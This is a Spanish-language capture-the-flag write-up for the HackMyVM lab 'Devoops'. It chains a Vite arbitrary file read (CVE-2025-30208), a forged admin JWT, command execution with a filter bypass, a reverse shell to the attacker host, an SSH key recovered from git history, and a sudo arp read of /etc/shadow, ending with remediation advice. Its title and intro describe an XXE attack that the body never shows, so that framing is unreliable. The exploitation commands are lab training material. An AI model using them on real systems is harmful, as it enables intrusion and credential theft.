Devoops — XXE + DevOps Misconfiguration

Explotación de vulnerabilidad XXE (XML External Entity) en una aplicación DevOps. Inyección de entidades XML para leer archivos del sistema, obtención de credenciales SSH y escalada de privilegios mediante configuración insegura de herramientas DevOps.

Resumen Ejecutivo

La máquina Devoops (HackMyVM) expone un único servicio HTTP en el puerto 3000/tcp — un servidor de desarrollo Vite 6.2 + Vue.js con un backend Express.js en localhost:3001. La superficie de ataque es reducida pero la cadena de explotación es completa, partiendo de una vulnerabilidad de lectura arbitraria de ficheros (CVE-2025-30208) hasta obtener una shell como root.

El vector principal aprovecha que el servidor Vite en modo desarrollo sirve cualquier fichero del sistema de archivos al añadir el parámetro ?raw?? a la URL. Esto expone el fichero .env con el secreto JWT, permitiendo forjar tokens de administrador y ejecutar comandos arbitrarios en el sistema a través del endpoint /execute, bypasseando el filtro de comandos mediante concatenación de cadenas.

La escalada a root se consigue en dos saltos: recuperación de una clave SSH privada de un commit git eliminado en Gitea, y explotación del permiso sudo arp para leer /etc/shadow y crackear la contraseña de root.

Vulnerabilidades Identificadas

🔴 VULN 1 — Vite Arbitrary File Read (CVE-2025-30208) Crítico

El servidor Vite en modo desarrollo no valida correctamente las rutas de ficheros cuando se añade el sufijo ?raw?? a la URL. Permite leer cualquier fichero accesible por el proceso Node.js, incluyendo /etc/passwd, .env y server.js.

💻 Explotación CVE-2025-30208
# Leer /etc/passwd curl 'http://10.0.2.12:3000/etc/passwd?raw??' → root:x:0:0:root:/root:/bin/sh → runner:x:1000:1000:::/bin/sh → hana:x:1001:100::/home/hana:/bin/sh # Leer .env — JWT_SECRET expuesto curl 'http://10.0.2.12:3000/.env?raw??' → JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz' → COMMAND_FILTER='nc,python,bash,sh,ash,|,&,<,>,ls,cat,pwd,...' # Leer server.js — código fuente completo del backend curl 'http://10.0.2.12:3000/server.js?raw??' → Código fuente completo del API (rutas, lógica, filtros)

🔴 VULN 2 — JWT Forjado + Remote Code Execution Crítico

Con el JWT_SECRET extraído del .env, se forjó un token JWT con rol admin. El endpoint /execute?cmd= ejecuta comandos OS. El filtro de comandos se evade mediante concatenación de strings bash (n""c → nc).

💻 JWT Forjado + RCE
# Generar JWT admin con el secret extraído python3 -c "import jwt,time; print(jwt.encode({'uid':0,'role':'admin','iat':int(time.time())}, '2942szKG7Ev83aDviugAa6rFpKixZzZz', 'HS256'))" → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... # Verificar RCE curl -H "Authorization: Bearer <TOKEN>" "http://10.0.2.12:3000/execute?cmd=id" → uid=1000(runner) gid=1000(runner)... # Reverse shell — bypass filtro con concatenación # "nc" bloqueado → "n""c" permitido; "sh" → "s""h" curl -H "Authorization: Bearer <TOKEN>" "http://10.0.2.12:3000/execute?cmd=n%22%22c+10.0.2.4+1234+-e+s%22%22h" → Reverse shell recibida como runner (uid=1000)

🟠 VULN 3 — Clave SSH Privada en Historial Git Alto

Un commit de Gitea titulado "del: oops!" eliminó una clave SSH privada ED25519 del usuario hana. El contenido permanece recuperable en el historial git con git show.

💻 Extracción de clave SSH
# Copiar el repo bare cp -r /opt/gitea/git/hana/node.git /tmp/dotgit # Ver commits git --git-dir=/tmp/dotgit log --oneline 1994a70 del: oops! 02c0f91 init: init commit # Extraer la clave del commit de borrado git --git-dir=/tmp/dotgit show 1994a70 ----- BEGIN OPENSSH PRIVATE KEY ----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw... ----- END OPENSSH PRIVATE KEY ----- # Port-forward SSH y conexión como hana socat TCP-LISTEN:4444,fork TCP:127.0.0.1:22 & ssh -i id_ed25519 hana@10.0.2.12 -p 4444 → uid=1001(hana) — Shell obtenida ✓

🟠 VULN 4 — Privilege Escalation: sudo arp Alto

El usuario hana puede ejecutar /sbin/arp como root sin contraseña. El comando arp -v -f permite leer /etc/shadow y obtener el hash de root, crackeado con rockyou.txt.

💻 Escalada a root
# Verificar permisos sudo sudo -l → (root) NOPASSWD: /sbin/arp # Leer /etc/shadow con sudo arp (GTFOBins) sudo arp -v -f /etc/shadow 2>&1 | grep root >> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKET... # Crackear hash con John / Hashcat john --format=sha512crypt --wordlist=rockyou.txt hash.txt → eris (root) # Escalar a root su root → password: eris → uid=0(root) gid=0(root) — ROOT ✓

Cadena de Ataque Completa

Paso 1 — Reconocimiento
🔍 Descubrimiento de superficie de ataque
Nmap revela un único puerto abierto: 3000/tcp. FFuf descubre los endpoints /server, /sign y /execute. Se confirma Vite 6.2 — versión vulnerable a CVE-2025-30208.
Paso 2 — Lectura Arbitraria de Ficheros
📄 CVE-2025-30208 — Extracción de secretos
Con ?raw?? se leen /etc/passwd, .env (JWT_SECRET) y server.js (lógica completa del backend).
Paso 3 — JWT Forjado + RCE
🔑 Ejecución remota de comandos como runner
Token JWT forjado con rol admin. Bypass del filtro de comandos con concatenación de strings bash. Reverse shell como runner (uid=1000).
Paso 4 — Gitea + Git History
🐙 Recuperación de clave SSH privada
Gitea corriendo como root. Commit "del: oops!" contiene la clave ED25519 de hana en el historial.
Paso 5 — Port Forward + SSH
🌀 Acceso SSH como hana
Socat para exponer el puerto SSH interno. Conexión con la clave ED25519 → hana (uid=1001). User flag obtenida.
Paso 6 — GTFOBins: sudo arp
⚡ Lectura de /etc/shadow y crackeo
arp -v -f /etc/shadow como root. Hash SHA-512 crackeado → contraseña: eris.
Paso 7 — Root
👑 Acceso total al sistema
su root con la contraseña eris. Shell como root (uid=0). Root flag obtenida.

Recomendaciones de Remediación

🚫 No exponer Vite en modo dev
Actualizar Vite a ≥ 6.2.3 (fix de CVE-2025-30208). Nunca ejecutar vite dev en entornos accesibles desde la red. Usar builds de producción.
🔑 Proteger secretos del .env
Usar variables de entorno del sistema, servicios de secretos (Vault, AWS Secrets Manager). Nunca exponer .env en el docroot.
🧹 Limpiar historial git
Usar git filter-repo o BFG Repo-Cleaner para eliminar ficheros sensibles. Implementar pre-commit hooks con detect-secrets.
🛡️ Restringir permisos sudo
Eliminar el permiso (root) NOPASSWD: /sbin/arp. Auditar todos los permisos sudo. Consultar GTFOBins para identificar binarios peligrosos.
🔒 Mejorar filtrado de comandos
El filtro basado en blacklist es trivialmente evadible. Reemplazar por allowlist estricto. Considerar sandbox (seccomp, AppArmor, contenedores).
🌐 Segmentar servicios internos
SSH y API backend en loopback no es suficiente si se obtiene RCE. Usar autenticación adicional y segmentación de red real con firewalls.
